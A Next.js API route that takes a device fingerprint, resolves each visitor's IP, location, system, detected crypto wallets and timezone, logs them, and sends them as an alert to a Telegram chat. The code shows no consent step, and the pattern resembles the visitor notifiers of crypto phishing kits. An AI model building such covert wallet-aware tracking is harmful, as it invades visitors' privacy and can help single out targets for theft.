import { NextResponse } from "next/server";
import { formatVisitorAlert, sendTelegramAlert } from "@/lib/telegram";
import { resolveVisitorContext, type VisitorMetaPayload } from "@/lib/visitorContext";

export const runtime = "nodejs";

type Payload = VisitorMetaPayload;

export async function POST(request: Request) {
  let body: Payload;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const fingerprintRaw = (body.deviceFingerprint ?? "").trim().slice(0, 800);
  if (fingerprintRaw.length < 8) {
    return NextResponse.json({ ok: false }, { status: 422 });
  }

  const context = await resolveVisitorContext(request, body);

  console.log("[visit]", {
    visitorType: context.visitorType,
    ip: context.ip,
    location: context.location,
    system: context.system,
    wallets: context.wallets,
    timezone: context.timezone,
    pagePath: context.path,
  });

  await sendTelegramAlert(
    formatVisitorAlert({
      visitorType: context.visitorType === "Unknown" ? "New user" : context.visitorType,
      location: context.location,
      ip: context.ip,
      system: context.system,
      wallets: context.wallets,
      timezone: context.timezone,
      path: context.path,
    }),
  );

  return NextResponse.json({ ok: true, visitorType: context.visitorType });
}
